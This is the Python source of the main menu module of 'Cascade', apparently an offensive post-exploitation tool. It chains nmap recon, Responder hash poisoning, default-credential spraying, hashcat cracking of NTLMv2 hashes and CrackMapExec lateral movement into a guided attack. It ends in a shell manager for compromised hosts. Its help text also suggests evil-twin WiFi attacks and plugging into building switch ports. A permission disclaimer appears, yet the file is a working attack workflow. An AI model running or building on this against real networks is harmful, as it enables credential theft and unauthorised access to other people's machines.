#!/usr/bin/env python3
"""
Cascade — Post-Exploitation Orchestrator
Only run against networks you own or have explicit written permission to test.
"""

import os, sys, shutil, subprocess, time

from . import tui, iface
from . import recon, harvest, spray, crack, lateral, shells


# ── session state ─────────────────────────────────────────────────────────────

class State:
    def __init__(self):
        self.interface    = "eth0"   # LAN interface (for nmap, Responder)
        self.subnet       = None     # None = auto-detect
        self.target_host  = None     # None = all hosts
        self.harvest_time = 120
        self.wordlist     = None
        self.verbose      = False
        self.full_scan    = False
        self.skip_harvest = False
        # runtime results
        self.hosts        = []
        self.hashes       = []
        self.spray_creds  = []
        self.cracked      = []
        self.compromised  = []

    def all_creds(self) -> list[dict]:
        return self.spray_creds + [
            {"target": "N/A", "service": "ntlmv2",
             "user": c["user"], "secret": c["password"]}
            for c in self.cracked
        ]

    def effective_subnet(self) -> str:
        if self.subnet:
            return self.subnet
        detected = iface.get_subnet(self.interface)
        return detected or "unknown"

    def status_bar(self) -> str:
        iface_info = _iface_status(self.interface)
        subnet_str = self.effective_subnet()
        target_str = self.target_host or "all hosts"

        results = []
        if self.hosts:       results.append(f"{tui.GRN}{len(self.hosts)} hosts{tui.R}")
        if self.hashes:      results.append(f"{tui.YLW}{len(self.hashes)} hashes{tui.R}")
        if self.spray_creds: results.append(f"{tui.GRN}{len(self.spray_creds)} creds{tui.R}")
        if self.cracked:     results.append(f"{tui.GRN}{len(self.cracked)} cracked{tui.R}")
        if self.compromised: results.append(f"{tui.RED}{tui.B}{len(self.compromised)} PWNED{tui.R}")
        result_str = "  │  ".join(results) if results else f"{tui.DIM}no results yet{tui.R}"

        return (
            f"  {tui.DIM}Interface :{tui.R} {iface_info}\n"
            f"  {tui.DIM}Subnet    :{tui.R} {tui.WH}{subnet_str}{tui.R}  "
            f"{tui.DIM}Target:{tui.R} {tui.WH}{target_str}{tui.R}\n"
            f"  {tui.DIM}Session   :{tui.R} {result_str}"
        )


def _iface_status(name: str) -> str:
    for i in iface.list_interfaces():
        if i["name"] == name:
            ip  = i["ip"] or tui.YLW + "no IP" + tui.R
            mode = f"  {tui.DIM}[{i['mode']}]{tui.R}" if i["mode"] != "?" else ""
            ok   = tui.GRN if i["ip"] else tui.RED
            return f"{ok}{tui.B}{name}{tui.R}  {tui.WH}{ip}{tui.R}{mode}"
    return f"{tui.DIM}{name} (not found){tui.R}"


# ── stage runners (with confirm) ──────────────────────────────────────────────

def _confirm(stage_name: str, detail: str, noise: str) -> str:
    """
    Ask user to continue, skip, or stop.
    Returns 'run', 'skip', or 'stop'.
    """
    tui.divider()
    print(f"\n  {tui.RED}{tui.B}{stage_name}{tui.R}")
    print(f"  {tui.DIM}{detail}{tui.R}")
    print(f"  {tui.YLW}Noise level: {noise}{tui.R}\n")
    while True:
        raw = input(f"  {tui.WH}{tui.B}[Y] run  [s] skip  [q] stop here → {tui.R}").strip().lower()
        if raw in ("", "y"):  return "run"
        if raw == "s":        return "skip"
        if raw == "q":        return "stop"


def _require_managed(state: State) -> bool:
    """Check adapter is in managed mode before running network-facing stages."""
    if not iface.ensure_managed(state.interface):
        tui.error("Cannot run this stage in monitor mode. Switch to managed first.")
        return False
    if not iface.has_ip(state.interface):
        tui.error(f"{state.interface} has no IP — connect to the network first (Setup → 3 or 4).")
        return False
    return True


def run_stage1(state: State) -> bool:
    if not _require_managed(state):
        return True   # don't stop chain, just skip
    decision = _confirm(
        "STAGE 1 — RECON",
        f"nmap scan of {state.effective_subnet()}. Finds live hosts, ports, services.",
        "LOW — passive scan, no exploitation"
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 1 skipped."); return True

    tui.phase("STAGE 1 — RECON")
    hosts = recon.scan(
        subnet  = state.subnet,
        fast    = not state.full_scan
    )
    state.hosts = hosts
    if not hosts:
        tui.warn("No hosts found. Check interface and subnet.")
    else:
        tui.success(f"Found {len(hosts)} host(s)")
        tui.host_table(hosts)
    return True


def run_stage2(state: State) -> bool:
    if not _require_managed(state):
        return True
    if state.skip_harvest:
        tui.warn("Stage 2 skipped (skip-harvest is ON).")
        return True

    decision = _confirm(
        "STAGE 2 — HASH HARVEST",
        f"Responder poisons LLMNR/NBT-NS on {state.interface} for {state.harvest_time}s.\n"
        f"  Windows machines hand over NTLMv2 hashes automatically.",
        "MEDIUM — poisoning LLMNR/NBT-NS, visible in Wireshark"
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 2 skipped."); return True

    tui.phase("STAGE 2 — HASH HARVEST")
    hashes = harvest.wait_and_capture(state.interface, timeout=state.harvest_time)
    state.hashes = hashes
    if hashes:
        tui.success(f"Captured {len(hashes)} hash(es)")
        for h in hashes:
            print(f"    {tui.DIM}{h[:80]}{'…' if len(h) > 80 else ''}{tui.R}")
    else:
        tui.warn("No hashes captured — network may be quiet or Responder blocked")
    return True


def run_stage3(state: State) -> bool:
    if not state.hosts:
        tui.warn("No hosts from Stage 1 — run recon first or skip.")

    decision = _confirm(
        "STAGE 3 — CREDENTIAL SPRAY",
        f"Tries default credentials (admin/admin, root/root, etc.) against\n"
        f"  SSH, SMB, and HTTP admin panels on {len(state.hosts)} discovered host(s).",
        "MEDIUM — login attempts, may trigger lockout policies"
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 3 skipped."); return True

    tui.phase("STAGE 3 — CREDENTIAL SPRAY")
    if not state.hosts:
        tui.warn("No hosts to spray.")
        return True

    results = spray.spray(state.hosts, verbose=state.verbose)
    state.spray_creds = results
    if results:
        tui.success(f"Found {len(results)} valid credential(s)")
        tui.cred_table(results)
    else:
        tui.warn("No default credentials found")
    return True


def run_stage4(state: State) -> bool:
    if not state.hashes:
        tui.warn("No hashes from Stage 2.")

    decision = _confirm(
        "STAGE 4 — HASH CRACKING",
        f"hashcat NTLMv2 (mode 5600) against rockyou.txt.\n"
        f"  {len(state.hashes)} hash(es) queued.",
        "LOW — local CPU/GPU, no network traffic"
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 4 skipped."); return True

    tui.phase("STAGE 4 — HASH CRACKING")
    if not state.hashes:
        # offer manual paste
        print(f"  {tui.DIM}No hashes from Responder. Paste NTLMv2 hashes below (empty line to finish):{tui.R}\n")
        lines = []
        while True:
            try:
                line = input("  ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not line:
                break
            lines.append(line)
        state.hashes = lines

    cracked = crack.crack_ntlmv2(state.hashes, wordlist=state.wordlist)
    state.cracked = cracked
    if cracked:
        tui.success(f"Cracked {len(cracked)} hash(es)")
    else:
        tui.warn("No hashes cracked")
    return True


def run_stage5(state: State) -> bool:
    creds = state.all_creds()
    if not creds:
        tui.warn("No credentials available for lateral movement.")

    decision = _confirm(
        "STAGE 5 — LATERAL MOVEMENT",
        f"CrackMapExec over SMB/WinRM + SSH with {len(creds)} credential(s)\n"
        f"  against {len(state.hosts)} host(s).",
        "HIGH — active login attempts on every host, very noisy"
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 5 skipped."); return True

    tui.phase("STAGE 5 — LATERAL MOVEMENT")
    if not creds:
        tui.warn("No credentials to use.")
        return True

    host_map    = {h["ip"]: h for h in state.hosts}
    raw_results = lateral.run_kill_chain(state.hosts, creds)
    compromised = []
    for r in raw_results:
        if r.get("pwned"):
            host = host_map.get(r["ip"], {"ip": r["ip"], "hostname": "", "ports": []})
            cred = next((c for c in creds if c["user"] == r.get("user")), creds[0])
            compromised.append({"host": host, "cred": cred})

    state.compromised = compromised
    if compromised:
        tui.success(f"Gained access to {len(compromised)} host(s)")
    else:
        tui.warn("No lateral movement succeeded")
    return True


# ── full kill chain ───────────────────────────────────────────────────────────

def run_full_chain(state: State):
    tui.clear()
    tui.print_banner()
    tui.phase("KILL CHAIN")
    tui.info(f"Interface : {state.interface}")
    tui.info(f"Subnet    : {state.effective_subnet()}")
    tui.info(f"Target    : {state.target_host or 'all hosts'}")
    tui.info(f"Harvest   : {'skip' if state.skip_harvest else str(state.harvest_time) + 's'}")
    print()

    try:
        if not run_stage1(state): return
        if not run_stage2(state): return
        if not run_stage3(state): return
        if not run_stage4(state): return
        if not run_stage5(state): return
    except KeyboardInterrupt:
        print(f"\n\n  {tui.DIM}Interrupted.{tui.R}\n")

    _print_summary(state)

    if state.compromised:
        ans = input(f"\n  {tui.WH}{tui.B}Open shell manager? [Y/n] {tui.R}").strip().lower()
        if ans != "n":
            shells.access_menu(state.compromised)
    elif state.all_creds():
        guesses = [
            {"host": h, "cred": state.all_creds()[0]}
            for h in state.hosts
            if any(p in (h.get("ports") or []) for p in [22, 445, 5985])
        ]
        if guesses:
            ans = input(f"\n  {tui.WH}{tui.B}Try manual shell with found credentials? [Y/n] {tui.R}").strip().lower()
            if ans != "n":
                shells.access_menu(guesses)


def _print_summary(state: State):
    tui.phase("RESULTS")
    tui.stage_result("Recon",         bool(state.hosts),        f"{len(state.hosts)} host(s)")
    tui.stage_result("Hash Harvest",  bool(state.hashes),       f"{len(state.hashes)} hash(es)")
    tui.stage_result("Cred Spray",    bool(state.spray_creds),  f"{len(state.spray_creds)} valid")
    tui.stage_result("Hash Cracking", bool(state.cracked),      f"{len(state.cracked)} cracked")
    tui.stage_result("Lateral Move",  bool(state.compromised),  f"{len(state.compromised)} PWNED")

    if state.all_creds():
        print()
        tui.success("Valid credentials:")
        tui.cred_table(state.all_creds())

    if state.compromised:
        print()
        tui.success("Compromised hosts:")
        for e in state.compromised:
            h = e["host"]; c = e["cred"]
            print(f"    {tui.GRN}{tui.B}{h['ip']:<16}{tui.R}  "
                  f"{tui.DIM}{h.get('hostname','')}  as {c['user']}{tui.R}")
    print()


# ── adapter picker (shown at startup + in setup) ──────────────────────────────

def adapter_picker(state: State):
    """
    Full adapter selection screen — shows all interfaces with mode, IP,
    lets user pick, then offers to switch mode or connect to WiFi.
    """
    while True:
        tui.clear()
        tui.print_banner()
        tui.phase("SELECT ADAPTER")

        interfaces = iface.list_interfaces()
        if not interfaces:
            tui.error("No network interfaces found.")
            input(f"  {tui.DIM}[ press Enter ]{tui.R}")
            return

        print(f"  {tui.DIM}Cascade needs {tui.R}{tui.WH}MANAGED{tui.DIM} mode + an IP address on the target LAN.")
        print(f"  MONITOR = passive sniffing only (use for Fracture/wifite, not Cascade).")
        print(f"  Pick your adapter, then connect to the target network.{tui.R}")
        print()
        print(f"  {tui.WH}{tui.B}  #  NAME          MODE        IP ADDRESS        MAC{tui.R}")
        tui.divider()
        for i, fc in enumerate(interfaces, 1):
            ip_col  = tui.GRN if fc["ip"] else tui.RED
            ip_str  = fc["ip"] or "no IP"
            mode    = fc["mode"] or "wired"
            m_col   = (tui.YLW if fc["mode"] and "MONITOR" in fc["mode"]
                       else tui.GRN if fc["mode"] and "MANAGED" in fc["mode"]
                       else tui.DIM)
            cur     = f" {tui.RED}{tui.B}←{tui.R}" if fc["name"] == state.interface else ""
            print(
                f"  {tui.DIM}{i:>2}{tui.R}  "
                f"{tui.WH}{tui.B}{fc['name']:<12}{tui.R}  "
                f"{m_col}{mode:<11}{tui.R}  "
                f"{ip_col}{ip_str:<17}{tui.R}  "
                f"{tui.DIM}{fc['mac'] or ''}{tui.R}{cur}"
            )
        tui.divider()
        print(f"\n  {tui.DIM}Enter number to select  |  0 / Enter → back{tui.R}\n")

        raw = input(f"  {tui.WH}{tui.B}adapter → {tui.R}").strip()
        if raw in ("0", ""):
            return

        try:
            idx = int(raw) - 1
        except ValueError:
            continue
        if not (0 <= idx < len(interfaces)):
            continue

        picked = interfaces[idx]
        state.interface = picked["name"]
        state.subnet    = None    # reset subnet on adapter change
        tui.success(f"Using adapter: {tui.WH}{tui.B}{picked['name']}{tui.R}")
        time.sleep(0.4)

        # If wireless and in monitor mode — offer to switch to managed
        if picked["wireless"] and picked["mode"] and "MONITOR" in picked["mode"]:
            tui.warn(f"{picked['name']} is in MONITOR mode.")
            tui.info("Cascade needs MANAGED mode for nmap, Responder, and CME.")
            ans = input(f"  {tui.WH}Switch to MANAGED now? [Y/n] {tui.R}").strip().lower()
            if ans != "n":
                iface.set_mode(picked["name"], "managed")
                time.sleep(0.5)

        # If no IP — offer WiFi scan+connect or nmtui
        if not picked["ip"]:
            tui.warn(f"{picked['name']} has no IP — not connected to any network.")
            print(f"\n  {tui.WH}How do you want to connect?{tui.R}\n")
            print(f"  {tui.RED}{tui.B}1{tui.R}  Scan for WiFi networks and connect")
            print(f"  {tui.RED}{tui.B}2{tui.R}  Launch nmtui (full network manager)")
            print(f"  {tui.RED}{tui.B}3{tui.R}  Skip — I'll connect manually / using ethernet\n")
            choice = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip()
            if choice == "1":
                wifi_connect_flow(state)
            elif choice == "2":
                iface.launch_nmtui()
        return


# ── WiFi scan + connect flow ──────────────────────────────────────────────────

def wifi_connect_flow(state: State):
    """
    Scan for nearby WiFi networks on the current adapter,
    let user pick one, ask for password, and connect.
    """
    tui.clear()
    tui.print_banner()
    tui.phase(f"WIFI SCAN — {state.interface}")

    networks = iface.scan_wifi(state.interface)
    if not networks:
        tui.warn("No networks found. Make sure the adapter is up and in managed mode.")
        input(f"\n  {tui.DIM}[ press Enter to go back ]{tui.R}")
        return

    tui.success(f"Found {len(networks)} network(s)")
    iface.print_wifi_table(networks)

    print(f"\n  {tui.DIM}Enter number to connect  |  r to rescan  |  0 / Enter → back{tui.R}\n")
    raw = input(f"  {tui.WH}{tui.B}network → {tui.R}").strip().lower()

    if raw in ("0", ""):
        return
    if raw == "r":
        wifi_connect_flow(state)
        return

    try:
        idx = int(raw) - 1
    except ValueError:
        return
    if not (0 <= idx < len(networks)):
        return

    target = networks[idx]
    ssid   = target["ssid"]
    sec    = target["security"]

    tui.info(f"Target: {tui.WH}{tui.B}{ssid}{tui.R}  [{sec}]  BSSID: {target['bssid']}")

    password = None
    if sec != "OPEN":
        password = input(f"\n  {tui.WH}Password for '{ssid}': {tui.R}").strip()
        if not password:
            tui.warn("No password entered — aborting.")
            return

    if iface.connect_wifi(state.interface, ssid, password):
        state.subnet = None    # force re-detect now that we have an IP
        tui.success(f"Connected. Subnet: {tui.WH}{state.effective_subnet()}{tui.R}")
    else:
        tui.error("Failed to connect. Wrong password or network unavailable.")

    input(f"\n  {tui.DIM}[ press Enter to continue ]{tui.R}")


# ── setup menu ────────────────────────────────────────────────────────────────

def setup_menu(state: State):
    while True:
        tui.clear()
        tui.print_banner()
        tui.phase("SETUP")

        # Guidance box
        print(f"  {tui.YLW}{tui.B}What mode should my adapter be in?{tui.R}")
        print(f"  {tui.DIM}Cascade uses {tui.R}{tui.WH}MANAGED{tui.DIM} mode — normal WiFi client mode.")
        print(f"  MONITOR mode is for passive sniffing (Fracture, wifite, airgeddon).")
        print(f"  If your adapter shows [MONITOR], switch it to [MANAGED] before attacking.{tui.R}")
        print()
        print(f"  {tui.YLW}{tui.B}How do I get on the target network?{tui.R}")
        print(f"  {tui.DIM}Option A: plug ethernet into a wall port — instant IP, no config needed.")
        print(f"  Option B: use option 3 below to scan WiFi and connect with a password.")
        print(f"  Option C: use nmtui (option 4) for full network manager if option 3 fails.{tui.R}")
        print()

        # Current state summary
        cur_iface = next(
            (i for i in iface.list_interfaces() if i["name"] == state.interface),
            None
        )
        ip_str   = (cur_iface["ip"] if cur_iface and cur_iface["ip"]
                    else f"{tui.RED}no IP — not connected{tui.R}")
        mode_str = (cur_iface["mode"] if cur_iface and cur_iface["mode"]
                    else "wired")
        m_col    = (tui.RED if cur_iface and cur_iface["mode"]
                    and "MONITOR" in cur_iface["mode"] else tui.GRN)
        mode_warn = (f"  {tui.RED}{tui.B}← switch to MANAGED before attacking!{tui.R}"
                     if cur_iface and cur_iface["mode"]
                     and "MONITOR" in cur_iface["mode"] else "")

        print(f"  {tui.DIM}Adapter :{tui.R}  {tui.WH}{tui.B}{state.interface}{tui.R}"
              f"  {m_col}[{mode_str}]{tui.R}  {tui.WH}{ip_str}{tui.R}{mode_warn}")
        print(f"  {tui.DIM}Subnet  :{tui.R}  {tui.WH}{state.subnet or 'auto-detect'}{tui.R}")
        print(f"  {tui.DIM}Target  :{tui.R}  {tui.WH}{state.target_host or 'all hosts'}{tui.R}")
        print()
        tui.divider()

        print(f"  {tui.RED}{tui.B} 1{tui.R}  {tui.WH}Select adapter{tui.R}"
              f"          {tui.DIM}see all adapters, pick one, check mode + IP{tui.R}")
        print(f"  {tui.RED}{tui.B} 2{tui.R}  {tui.WH}Switch adapter mode{tui.R}"
              f"     {tui.DIM}toggle MANAGED ↔ MONITOR  "
              f"(current: {m_col}{mode_str}{tui.R}{tui.DIM}){tui.R}")
        print(f"  {tui.RED}{tui.B} 3{tui.R}  {tui.WH}Scan WiFi + connect{tui.R}"
              f"     {tui.DIM}scan nearby networks, pick one, enter password{tui.R}")
        print(f"  {tui.RED}{tui.B} 4{tui.R}  {tui.WH}Connect via nmtui{tui.R}"
              f"       {tui.DIM}full interactive network manager (fallback){tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 5{tui.R}  {tui.WH}Set subnet manually{tui.R}"
              f"     {tui.DIM}current: {state.subnet or 'auto-detect'}{tui.R}")
        print(f"  {tui.RED}{tui.B} 6{tui.R}  {tui.WH}Set target host{tui.R}"
              f"         {tui.DIM}current: {state.target_host or 'all hosts'}{tui.R}")
        print(f"  {tui.RED}{tui.B} 7{tui.R}  {tui.WH}Set Responder window{tui.R}"
              f"    {tui.DIM}current: {state.harvest_time}s{tui.R}")
        print(f"  {tui.RED}{tui.B} 8{tui.R}  {tui.WH}Set custom wordlist{tui.R}"
              f"     {tui.DIM}current: {state.wordlist or 'rockyou.txt'}{tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 9{tui.R}  {tui.WH}Toggle skip-harvest{tui.R}"
              f"     {tui.DIM}{'ON — Responder skipped' if state.skip_harvest else 'off'}{tui.R}")
        print(f"  {tui.RED}{tui.B}10{tui.R}  {tui.WH}Toggle verbose{tui.R}"
              f"          {tui.DIM}{'on' if state.verbose else 'off'}{tui.R}")
        print(f"  {tui.RED}{tui.B}11{tui.R}  {tui.WH}Tool status{tui.R}"
              f"             {tui.DIM}what's installed, what's missing{tui.R}")
        tui.divider()
        print(f"\n  {tui.DIM}   0 / Enter → back{tui.R}\n")

        raw = input(f"  {tui.WH}{tui.B}setup → {tui.R}").strip()

        if raw in ("0", ""):
            return

        elif raw == "1":
            adapter_picker(state)

        elif raw == "2":
            _switch_mode_prompt(state)

        elif raw == "3":
            wifi_connect_flow(state)

        elif raw == "4":
            iface.launch_nmtui()

        elif raw == "5":
            v = input(f"\n  {tui.WH}Subnet CIDR (blank = auto): {tui.R}").strip()
            state.subnet = v or None
            tui.success(f"Subnet: {state.subnet or 'auto-detect'}")
            time.sleep(0.8)

        elif raw == "6":
            v = input(f"\n  {tui.WH}Target IP (blank = all hosts): {tui.R}").strip()
            state.target_host = v or None
            tui.success(f"Target: {state.target_host or 'all hosts'}")
            time.sleep(0.8)

        elif raw == "7":
            v = input(f"\n  {tui.WH}Responder window seconds [{state.harvest_time}]: {tui.R}").strip()
            try:
                state.harvest_time = int(v)
                tui.success(f"Harvest time: {state.harvest_time}s")
            except ValueError:
                tui.warn("Invalid number.")
            time.sleep(0.8)

        elif raw == "8":
            v = input(f"\n  {tui.WH}Wordlist path (blank = default): {tui.R}").strip()
            state.wordlist = v or None
            tui.success(f"Wordlist: {state.wordlist or 'default'}")
            time.sleep(0.8)

        elif raw == "9":
            state.skip_harvest = not state.skip_harvest
            tui.success(f"Skip-harvest: {'ON' if state.skip_harvest else 'off'}")
            time.sleep(0.8)

        elif raw == "10":
            state.verbose = not state.verbose
            tui.success(f"Verbose: {'on' if state.verbose else 'off'}")
            time.sleep(0.8)

        elif raw == "11":
            tui.clear(); tui.print_banner(); tui.phase("TOOL STATUS")
            iface.print_tool_status()
            input(f"  {tui.DIM}[ press Enter to go back ]{tui.R}")


def _switch_mode_prompt(state: State):
    """Switch the current adapter's mode."""
    wireless = iface.list_wireless()
    if not wireless:
        tui.warn("No wireless adapters found.")
        time.sleep(1)
        return

    tui.clear(); tui.print_banner(); tui.phase("SWITCH ADAPTER MODE")
    print(f"  {tui.WH}{tui.B}  #  NAME          CURRENT MODE{tui.R}")
    tui.divider()
    for i, w in enumerate(wireless, 1):
        m_col = tui.YLW if w["mode"] and "MONITOR" in w["mode"] else tui.GRN
        cur   = f" {tui.RED}{tui.B}←{tui.R}" if w["name"] == state.interface else ""
        print(f"  {tui.DIM}{i:>2}{tui.R}  {tui.WH}{w['name']:<12}{tui.R}  "
              f"{m_col}{w['mode']}{tui.R}{cur}")
    tui.divider()
    print(f"\n  {tui.DIM}0 / Enter → back{tui.R}\n")

    raw = input(f"  {tui.WH}{tui.B}adapter → {tui.R}").strip()
    if raw in ("0", ""):
        return
    try:
        idx = int(raw) - 1
        if not (0 <= idx < len(wireless)):
            return
        w       = wireless[idx]
        current = (w["mode"] or "").upper()
        target  = "managed" if "MONITOR" in current else "monitor"
        print(f"\n  {tui.WH}Switch {tui.B}{w['name']}{tui.R} "
              f"from {tui.YLW}{current}{tui.R} → {tui.YLW}{target.upper()}{tui.R}")
        ans = input(f"  Confirm? [Y/n] {tui.R}").strip().lower()
        if ans != "n":
            iface.set_mode(w["name"], target)
            time.sleep(1)
    except (ValueError, IndexError):
        pass


# ── about / help ──────────────────────────────────────────────────────────────

def _print_about():
    from . import __version__
    tui.clear()
    tui.print_banner()
    print(f"""  {tui.WH}{tui.B}CASCADE  v{__version__}  —  Post-Exploitation Kill Chain Orchestrator{tui.R}

  Cascade automates the internal network kill chain. Once you have a
  foothold on a LAN segment (ethernet, evil twin, open port) it chains
  five stages into a guided, menu-driven attack flow.

  {tui.RED}{tui.B}STAGE 1 — Recon{tui.R}
    nmap sweeps the subnet. Finds live hosts, open ports, services, OS.
    Noise: LOW. Takes 30-90 seconds.

  {tui.RED}{tui.B}STAGE 2 — Hash Harvest (Responder){tui.R}
    Poisons LLMNR / NBT-NS / WPAD. Windows machines automatically hand
    over NTLMv2 hashes when they try to resolve any name. You just wait.
    Noise: MEDIUM. Visible in Wireshark. Runs for a configurable window.

  {tui.RED}{tui.B}STAGE 3 — Credential Spray{tui.R}
    Tries default/common creds (admin/admin, root/root, pi/raspberry...)
    against SSH, SMB, and HTTP admin panels on every discovered host.
    Noise: MEDIUM. Login attempts logged on target systems.

  {tui.RED}{tui.B}STAGE 4 — Hash Cracking{tui.R}
    hashcat NTLMv2 (mode 5600) against rockyou.txt or custom wordlist.
    Noise: ZERO — local CPU/GPU only.

  {tui.RED}{tui.B}STAGE 5 — Lateral Movement{tui.R}
    CrackMapExec over SMB/WinRM + paramiko over SSH. If any cred is a
    local admin on a host, it shows Pwn3d! — full command execution.
    Noise: HIGH — many login attempts across the network.

  {tui.WH}{tui.B}ADAPTER STATE{tui.R}
    Cascade uses a LAN interface (eth0, wlan0, etc.) in {tui.YLW}MANAGED{tui.R} mode.
    Do NOT put the interface in monitor mode — Responder and nmap need
    normal (managed) operation. Monitor mode is for WiFi capture tools
    like Fracture, wifite, and airgeddon.

  {tui.WH}{tui.B}GETTING ON THE NETWORK{tui.R}
    You must be on the same LAN as your targets before running Cascade.
    Options:
    - {tui.DIM}Ethernet: plug into any switch port in the building{tui.R}
    - {tui.DIM}WiFi: use nmtui (option 9 in Setup) to connect to the target network{tui.R}
    - {tui.DIM}Evil twin: use airgeddon/portal_cloner to get the WiFi password first{tui.R}

  {tui.WH}{tui.B}REQUIRED TOOLS{tui.R}
    {tui.DIM}sudo apt install nmap responder hashcat crackmapexec sshpass smbclient python3-impacket{tui.R}
    {tui.DIM}sudo gem install evil-winrm{tui.R}

  {tui.DIM}Only run against networks you own or have explicit permission to test.{tui.R}
""")
    input(f"  {tui.DIM}[ press Enter to go back ]{tui.R}")


# ── main menu ─────────────────────────────────────────────────────────────────

def _warn_missing(state: State):
    """One-line missing tool warning for status bar."""
    missing = [t["tool"] for t in iface.check_tools() if not t["found"]]
    if missing:
        return (f"\n  {tui.YLW}{tui.B}Missing tools:{tui.R} "
                f"{tui.DIM}{', '.join(missing[:4])}{'...' if len(missing) > 4 else ''}"
                f"  (run Setup → 10 for details){tui.R}")
    return ""


def _warn_no_ip(state: State):
    """Warn if selected interface has no IP."""
    if not iface.has_ip(state.interface):
        return (f"\n  {tui.RED}{tui.B}[!]{tui.R} {tui.YLW}{state.interface} has no IP address "
                f"— not connected to a network. Go to Setup → Connect (9).{tui.R}")
    return ""


def main_menu(state: State):
    while True:
        tui.clear()
        tui.print_banner()

        print(state.status_bar())
        print(_warn_no_ip(state))
        print(_warn_missing(state))
        print()
        tui.divider()

        print(f"  {tui.RED}{tui.B} 1{tui.R}  {tui.WH}{tui.B}Full kill chain{tui.R}"
              f"  {tui.DIM}guided: recon → harvest → spray → crack → lateral → shells{tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 2{tui.R}  {tui.WH}Recon{tui.R}"
              f"          {tui.DIM}nmap scan — find hosts, ports, services{tui.R}")
        print(f"  {tui.RED}{tui.B} 3{tui.R}  {tui.WH}Hash harvest{tui.R}"
              f"   {tui.DIM}Responder — capture NTLMv2 hashes passively{tui.R}")
        print(f"  {tui.RED}{tui.B} 4{tui.R}  {tui.WH}Cred spray{tui.R}"
              f"     {tui.DIM}SSH / SMB / HTTP default credential spray{tui.R}")
        print(f"  {tui.RED}{tui.B} 5{tui.R}  {tui.WH}Crack hashes{tui.R}"
              f"   {tui.DIM}hashcat NTLMv2 against wordlist{tui.R}")
        print(f"  {tui.RED}{tui.B} 6{tui.R}  {tui.WH}Lateral movement{tui.R}"
              f"  {tui.DIM}CrackMapExec + SSH with found credentials{tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 7{tui.R}  {tui.WH}Shell manager{tui.R}"
              f"  {tui.DIM}connect to compromised hosts — "
              f"{len(state.compromised)} available{tui.R}")
        print(f"  {tui.RED}{tui.B} 8{tui.R}  {tui.WH}Saved sessions{tui.R}"
              f" {tui.DIM}reconnect to previously compromised hosts{tui.R}")
        print()
        print(f"  {tui.DIM}   s  Setup          f  Free commands (bash)   "
              f"h  Help / about   q  Quit{tui.R}")
        tui.divider()
        print()

        try:
            raw = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip().lower()
        except KeyboardInterrupt:
            raw = "q"

        if raw == "q":
            print(f"\n  {tui.DIM}bye.{tui.R}\n")
            sys.exit(0)

        elif raw == "1":
            run_full_chain(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "2":
            tui.clear(); tui.print_banner()
            run_stage1(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "3":
            tui.clear(); tui.print_banner()
            run_stage2(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "4":
            tui.clear(); tui.print_banner()
            run_stage3(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "5":
            tui.clear(); tui.print_banner()
            run_stage4(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "6":
            tui.clear(); tui.print_banner()
            run_stage5(state)
            input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "7":
            if state.compromised:
                shells.access_menu(state.compromised)
            else:
                tui.clear(); tui.print_banner()
                tui.warn("No compromised hosts yet — run the kill chain first.")
                # Still let user try with any found creds
                creds = state.all_creds()
                if creds:
                    targets = [
                        {"host": h, "cred": creds[0]}
                        for h in state.hosts
                        if any(p in (h.get("ports") or []) for p in [22, 445, 5985])
                    ]
                    if targets:
                        ans = input(f"  {tui.WH}Try shell with found credentials anyway? [Y/n] {tui.R}").strip().lower()
                        if ans != "n":
                            shells.access_menu(targets)
                            continue
                input(f"\n  {tui.DIM}[ press Enter to return to menu ]{tui.R}")

        elif raw == "8":
            shells.saved_menu()

        elif raw == "s":
            setup_menu(state)

        elif raw == "f":
            tui.clear()
            print(f"  {tui.DIM}Dropping to bash. Type 'exit' to return to Cascade.{tui.R}\n")
            subprocess.call(["bash", "--login"])

        elif raw == "h":
            _print_about()


# ── entry point ───────────────────────────────────────────────────────────────

def main():
    if os.geteuid() != 0:
        print("[!] Run as root: sudo cascade")
        sys.exit(1)

    import argparse
    ap = argparse.ArgumentParser(
        description="Cascade — Post-exploitation orchestrator",
        epilog="Only run against networks you own or have permission to test.",
    )
    ap.add_argument("--version", action="version",
                    version=f"cascade {__import__('cascade').__version__}")
    ap.parse_args()

    state = State()

    # Auto-select first interface that already has an IP
    for i in iface.list_interfaces():
        if i["ip"] and i["name"] != "lo":
            state.interface = i["name"]
            break

    tui.clear()
    tui.print_banner()

    # If nothing is connected, run adapter picker before main menu
    if not iface.has_ip(state.interface):
        tui.warn("No connected interface detected.")
        tui.info("Let's pick an adapter and get you on the network first.")
        print()
        input(f"  {tui.DIM}[ press Enter to open adapter picker ]{tui.R}")
        adapter_picker(state)

    main_menu(state)


if __name__ == "__main__":
    main()
